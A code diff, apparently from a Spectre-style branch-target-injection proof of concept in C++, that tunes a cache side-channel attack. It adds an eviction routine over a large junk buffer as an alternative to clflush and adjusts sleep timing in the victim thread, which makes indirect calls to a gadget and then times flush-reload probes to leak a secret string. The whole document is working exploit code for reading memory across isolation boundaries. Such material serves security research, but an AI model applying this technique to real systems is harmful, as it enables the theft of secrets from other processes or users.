@@ -12,12 +12,14 @@ extern "C" {
 
   uint32_t memory_access(LPCBYTE);
   uint32_t flush_reload(LPCBYTE);
+  void evict(void *start, int count, int step);
 }
 
 const char TheAnswer[] = "Answer to the Ultimate Question of Life, The Universe, and Everything is 42";
 constexpr int probe_lines = 256;
 DWORD_PTR tat[probe_lines];
 uint8_t *probe = nullptr;
+uint8_t junk[10 * 1024 * 4096];
 
 auto gadget_module = GetModuleHandle(L"gadget.dll");
 void (*Touch)(uint8_t*, uint8_t*) = nullptr;
@@ -56,20 +58,27 @@ void victim_thread(const void *target, bool do_probe) {
 
   for (;;) {
     for (int trial = 0; trial < 20000; ++trial) {
+      Sleep(10);
       if (do_probe) {
+#if 0
         for (int i = 0; i < probe_lines; ++i)
           _mm_clflush(&probe[i * 4096]);
+#else
+        evict(junk, 10 * 1024, 2048);
+#endif
       }
       else {
+#if 1
         // This is strange.  For some reason, flushing the probe on the victim side
         // helps getting repro.  Need to find a way to get rid of this hack later.
         for (int i = 0; i < probe_lines; ++i)
           _mm_clflush(&probe[i * 4096]);
+#else
+        evict(junk, 10 * 1024, 2048);
+#endif
       }
 
-      Sleep(100);
       IndirectCall(call_destination, target, probe);
-
       if (!do_probe) continue;
 
       for (int i = 0; i < probe_lines; ++i)
